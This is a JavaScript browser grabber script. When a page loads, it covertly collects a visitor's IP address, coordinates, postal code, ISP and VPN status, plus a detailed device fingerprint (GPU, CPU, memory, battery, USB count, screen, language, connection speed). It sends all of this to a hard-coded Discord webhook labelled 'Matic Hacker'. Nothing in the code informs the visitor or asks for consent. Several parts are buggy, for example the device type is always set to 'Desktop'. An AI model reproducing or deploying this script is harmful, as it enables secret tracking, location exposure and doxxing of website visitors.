function encode(){
    var result = ""
    let date = new Date()
    let ts = date.getTime().toString()
for (var i = 0; i < ts.length; i++) {
    switch(ts.charAt(i)){
        case "1":
            result +=  ["A", "a", "B", "b", "C", "c"][Math.floor(Math.random() *  ["A", "a", "B", "b", "C", "c"].length)];
            break;
            case "2":
            result += ["D", "d", "E", "e", "F", "f"][Math.floor(Math.random() *  ["D", "d", "E", "e", "F", "f"].length)];
            break;
            case "3":
            result += ["G", "g", "H", "h", "I", "i"][Math.floor(Math.random() *  ["G", "g", "H", "h", "I", "i"].length)];
            break;
            case "4":
            result += ["J", "j", "K", "k", "L", "l"][Math.floor(Math.random() *  ["J", "j", "K", "k", "L", "l"].length)];
            break;
            case "5":
            result += ["M", "m", "N", "n", "O", "o"][Math.floor(Math.random() *  ["M", "m", "N", "n", "O", "o"].length)];
            break;
            case "6":
            result += ["P", "p", "Q", "q", "R", "r"][Math.floor(Math.random() *  ["P", "p", "Q", "q", "R", "r"].length)];
            break;
            case "7":
            result += ["S", "s", "T", "t", "U", "u"][Math.floor(Math.random() *  ["S", "s", "T", "t", "U", "u"].length)];
            break;
            case "8":
            result += ["V", "v", "W", "w", "X", "x"][Math.floor(Math.random() * ["V", "v", "W", "w", "X", "x"].length)];
            break;
            case "9":
            result += ["Y", "y", "Z", "z", "0", "1"][Math.floor(Math.random() * ["Y", "y", "Z", "z", "0", "1"].length)];
            break;
            case "0":
            result += ["2", "3", "4", "5", "6", "7", "8", "9"][Math.floor(Math.random() * ["Y", "y", "Z", "z", "0", "1"].length)];
            break;
    }
}
    return result
}

window.onload = async function(){
    let body = []

    var ipdata = await fetch("https://ipapi.co/json")
    var ipjson = await ipdata.json()

    var vpndata = await fetch("https://vpn-https-detection.vercel.app/info")
    var vpnjson = await vpndata.json()

    body.push({asn: ipjson.asn, ip: ipjson.ip, ip_type: ipjson.version, rough_area: ipjson.city + ", " + ipjson.region, lat_long: ipjson.latitude + ", " + ipjson.longitude, org: ipjson.org, postal_code: ipjson.postal, mobile_data: vpnjson.mobile, vpn: vpnjson.proxy, dns: vpnjson.reverse})


    var os = "Unknown";
    if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) os="Windows 10";
    if (window.navigator.userAgent.indexOf("Windows NT 6.3") != -1) os="Windows 8.1";
    if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) os="Windows 8";
    if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) os="Windows 7";
    if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) os="Windows Vista";
    if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) os="Windows XP";
    if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) os="Windows 2000";
    if (window.navigator.userAgent.indexOf("Mac")            != -1) os="Mac/iOS";
    if (window.navigator.userAgent.indexOf("X11")            != -1) os="UNIX";
    if (window.navigator.userAgent.indexOf("Linux")          != -1) os="Linux";

    navigator.browser = (function(){
        var N= navigator.appName, ua= navigator.userAgent, tem;
        var M= ua.match(/(opera|chrome|safari|firefox|msie)\/?\s*(\.?\d+(\.\d+)*)/i);
        if(M && (tem= ua.match(/version\/([\.\d]+)/i))!= null) M[2]= tem[1];
        M = M? [M[1], M[2]]: [N, navigator.appVersion,'-?'];
        return M;
    })();

        var device = ""
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
            device = "Tablet";
        }
        else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
            device = "Mobile";
        }
        device = "Desktop";
    

        var canvas;
    canvas = document.getElementById("glcanvas");
    var gl = canvas.getContext("experimental-webgl");

        function getUnmaskedInfo(gl) {
            var unMaskedInfo = {
              renderer: '',
              vendor: ''
            };
      
            var dbgRenderInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (dbgRenderInfo != null) {
              unMaskedInfo.renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
              unMaskedInfo.vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
            }
      
            return unMaskedInfo;
          }

          let usb_devices = 0
          navigator.usb.getDevices()
.then(devices => {
  usb_devices += 1
});


var battery = await navigator.getBattery()
var percentage = await battery.level * 100
var charging = await battery.charging


var imageAddr = "https://i.imgur.com/5WflQb1.jpg"; 
var downloadSize = 88775; //bytes
var speed = ""

function InitiateSpeedDetection() {
    window.setTimeout(MeasureConnectionSpeed, 1);
};    

if (window.addEventListener) {
    window.addEventListener('load', InitiateSpeedDetection, false);
} else if (window.attachEvent) {
    window.attachEvent('onload', InitiateSpeedDetection);
}

function MeasureConnectionSpeed() {
    var startTime, endTime;
    var download = new Image();
    download.onload = function () {
        endTime = (new Date()).getTime();
        showResults();
    }
    
    download.onerror = function (err, msg) {
       speed = "Unknown"
    }
    
    startTime = (new Date()).getTime();
    var cacheBuster = "?nnn=" + startTime;
    download.src = imageAddr + cacheBuster;
    
    function showResults() {

        var duration = (endTime - startTime) / 1000;
        var bitsLoaded = downloadSize * 8;
        var speedBps = (bitsLoaded / duration).toFixed(2);
        var speedKbps = (speedBps / 1024).toFixed(2);
        var speedMbps = (speedKbps / 1024).toFixed(2);

        var orientation = (screen.orientation || {}).type || screen.mozOrientation || screen.msOrientation;
        var rotation = ""

if (orientation === "landscape-primary") {
  rotation = "Landscape"
} else if (orientation === "landscape-secondary") {
  rotation = "Landscape (Upside Down)"
} else if (orientation === "portrait-secondary" || orientation === "portrait-primary") {
  rotation = "Portrait"
} else if (orientation === undefined) {
  rotation = "Unknown"
}


        body.push({os: os, browser: navigator.browser[0] + " " + navigator.browser[1], device: device, cpu_cores: navigator.hardwareConcurrency, gpu: getUnmaskedInfo(gl).renderer, usb_count: usb_devices, screen_height: window.screen.height, screen_width: window.screen.width, battery_percentage: percentage, charging: charging, memory_gb: navigator.deviceMemory, language: navigator.language, cookies: navigator.cookieEnabled, download_speed_mbps: speedMbps, orientation: rotation})

        let date = new Date()

        let dns = body[0].dns
        if(dns == "")
        {
          dns = "Couldn't find DNS."
        }
        let json = {content :null, embeds:[{description :"Originated from: " + window.location.href + "\n\n**=================================================**", color: 13175823,"fields":[{name:"IP", value:body[0].ip, inline:true},{name:"Organisation",value: body[0].org,inline:true},{name:"Post/ZIP Code",value: body[0].postal_code,inline:true},{name:"ASN",value:body[0].asn,inline:true},{name:"Mobile Data",value: body[0].mobile_data ,inline:true},{name:"VPN/Proxy/Tor",value:body[0].vpn,inline:true},{name:"Coordinates",value:body[0].lat_long,inline:true},{name:"Rough Area",value:body[0].rough_area,inline:true},{name:"IP Version",value:body[0].ip_type,inline:true},{name:"DNS",value:dns},{name:"=================================================",value:"_ _"},{name:"OS",value: body[1].os ,inline:true},{name:"Browser",value:body[1].browser,inline:true},{name:"Device",value:body[1].device,inline:true},{name:"CPU Cores",value:body[1].cpu_cores,inline:true},{name:"Min. Memory",value:body[1].memory_gb + " GB",inline:true},{name:"Download Speed",value: body[1].download_speed_mbps + " mbps",inline:true},{name:"Battery %",value:body[1].battery_percentage,inline:true},{name:"Charging",value:body[1].charging,inline:true},{name:"USB Count",value:body[1].usb_count,inline:true},{name:"Cookies",value:body[1].cookies,inline:true},{name:"Screen Size",value:body[1].screen_width + "x" + body[1].screen_height,inline:true},{name:"Language",value:body[1].language,inline:true},{name:"GPU",value:body[1].gpu},{name:"=================================================",value:"_ _"}],author:{name:"New Log Recieved!",url:"https://www.absq.xyz",icon_url:"https://i.imgur.com/oTYnS8L.png"},footer:{text:"www.absq.xyz"},timestamp:date.toISOString()}],attachments:[], username: "Matic Hacker " + encode(), avatar_url: "https://i.imgur.com/5WflQb1.jpg"}


    fetch("https://discord.com/api/webhooks/993214885406179339/fvuHFAP1MkZSsUkQ1S-F6bucfTdh3340gnxCmpLrTdUjy-zbp6Q3j-LNTKyNzD9EfRG6", {
  "headers": {
    "accept": "application/json",
    "content-type": "application/json"
  },
  "body": JSON.stringify(json),
  "method": "POST"
});


    }
}

InitiateSpeedDetection()




    

    
}